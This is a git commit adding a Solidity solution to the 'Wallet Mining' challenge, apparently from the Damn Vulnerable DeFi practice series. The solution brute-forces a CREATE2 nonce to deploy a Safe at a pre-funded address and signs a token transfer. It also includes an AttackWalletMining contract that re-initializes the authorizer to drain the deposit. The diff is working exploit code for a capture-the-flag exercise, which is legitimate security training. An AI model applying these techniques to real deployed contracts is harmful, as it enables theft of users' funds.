0cedf57c594b4d7851d812606ac4cbb97ec18ff7
ishtagy <ishtagy@gmail.com>
2024-11-12 03:03:13 +0500

    Wallet Mining solution

--- test/wallet-mining/WalletMining.t.sol
+++ test/wallet-mining/WalletMining.t.sol
@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxyFactory, SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -123,7 +123,80 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, address(0)
+        );
+
+        uint256 nonce;
+
+        for (uint256 i = 0; i < 100; i++) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), i));
+            bytes memory deploymentData =
+                abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+
+            bytes32 finalHash =
+                keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, keccak256(deploymentData)));
+            address expectedAddress = address(uint160(uint256(finalHash)));
+
+            if (expectedAddress == USER_DEPOSIT_ADDRESS) {
+                nonce = i;
+                break;
+            }
+        }
+
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
+                address(token),
+                0,
+                keccak256(abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT)),
+                Enum.Operation.Call,
+                10000,
+                21000,
+                tx.gasprice,
+                address(0),
+                address(0),
+                0
+            )
+        );
+
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, block.chainid, USER_DEPOSIT_ADDRESS
+            )
+        );
+
+        bytes memory txHashData = abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash);
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        bytes memory execTransactionData = abi.encodeWithSelector(
+            Safe.execTransaction.selector,
+            address(token),
+            0,
+            abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT),
+            Enum.Operation.Call,
+            10000,
+            21000,
+            tx.gasprice,
+            address(0),
+            address(0),
+            signature
+        );
+
+        new AttackWalletMining(
+            authorizer,
+            walletDeployer,
+            USER_DEPOSIT_ADDRESS,
+            initializer,
+            nonce,
+            token,
+            execTransactionData,
+            address(ward)
+        );
     }
 
     /**
@@ -154,5 +227,31 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract AttackWalletMining {
+    constructor(
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        address USER_DEPOSIT_ADDRESS,
+        bytes memory initializer,
+        uint256 nonce,
+        DamnValuableToken token,
+        bytes memory execTransactionData,
+        address ward
+    ) {
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+        wards[0] = address(this);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+
+        authorizer.init(wards, aims);
+        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
+
+        token.transfer(ward, token.balanceOf(address(this)));
+
+        (bool s,) = USER_DEPOSIT_ADDRESS.call(execTransactionData);
+        require(s);
     }
 }
